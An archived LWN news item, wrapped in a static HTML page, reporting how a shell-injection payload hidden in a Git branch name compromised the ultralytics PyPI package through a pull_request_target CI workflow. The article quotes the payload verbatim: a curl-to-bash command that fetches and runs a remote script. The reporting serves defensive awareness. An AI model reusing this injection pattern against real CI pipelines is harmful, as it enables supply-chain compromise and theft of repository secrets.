@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<!-- Prevent, to some degree, the execution of inline JavaScript, as well as blocking all plugin content  -->
+		<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none'; img-src 'none'; font-src 'none'; media-src 'none'; worker-src 'none'; connect-src 'none'; style-src 'self' ">
+		<title>Abusing Git branch names to compromise a PyPI package</title>
+		<link rel="icon" href="favicon.png" />
+		<link rel="stylesheet" href="/a11y-dark.css">
+		<link rel="stylesheet" href="/style.css">
+	</head>
+	<body>
+		<main>
+		<a target="_blank" rel="noreferrer" href="https://lwn.net/Articles/1001215/">Go to article URL</a>
+		<div id="content"><p></p><p>
+A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.
+The GitHub account 
+<a href="https://github.com/openimbot" rel="noreferrer" target="_blank">
+"OpenIM Robot"</a>
+(which appears to be controlled by
+<a href="https://nsddd.top/" rel="noreferrer" target="_blank">Xinwei Xiong</a>) opened
+<a href="https://github.com/ultralytics/ultralytics/pull/18018" rel="noreferrer" target="_blank">a pull request</a> for the 
+<a href="https://pypi.org/project/ultralytics/" rel="noreferrer" target="_blank">
+ultralytics</a>
+Python package. The pull request included a suspicious Git branch name:
+</p>
+
+<blockquote class="bq">
+openimbot:$({curl,-sSfL,raw.git<wbr>hub<wbr>user<wbr>content.com/ultra<wbr>lytics/<wbr>ultra<wbr>lytics/<wbr>12e4f5<wbr>4ca3<wbr>f2e6<wbr>9bcdc<wbr>900d<wbr>1c6e<wbr>16642<wbr>ca8ae<wbr>545/file.sh}${IFS}|${IFS}bash)
+</blockquote>
+
+<p>
+Unfortunately, ultralytics uses the
+<a href="https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#pull_request_target" rel="noreferrer" target="_blank"><tt>pull_request_target</tt></a> GitHub Action trigger to automate some of its continuous-integration tasks. This runs a script from the base branch of the repository, which has access to the repository's secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already removed the malicious script.
+</p>
+
+<p>
+This problem has been
+<a href="https://nathandavison.com/blog/github-actions-and-the-threat-of-malicious-pull-requests" rel="noreferrer" target="_blank">known</a> for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.
+</p><p></p></div>
+		<div class="content-meta">
+			<time datetime=2024-12-06T18:44:12.000Z>6 December 2024</time>
+			<a href="/urls/lwn-net-headlines-rss">lwn.net/headlines/rss</a>
+			<div> <a href="/tags/general.html">general</a> |  <a href="/tags/reporting.html">reporting</a></div>
+		</div>
+	</main>
+		<footer>
+			<nav>
+				<a href="/">Home</a>
+				<a href="/tags">Tags</a>
+				<a href="/urls">URLs</a>
+				<a rel="noreferrer" target="_blank" href="https://github.com/thoughtsunificator/rss-feed-static-generator">Source code</a>
+			</nav>
+		</footer>
+		<script src="/highlight.min.js"></script>
+		<script>hljs.highlightAll();</script>
+		</body>
+</html>
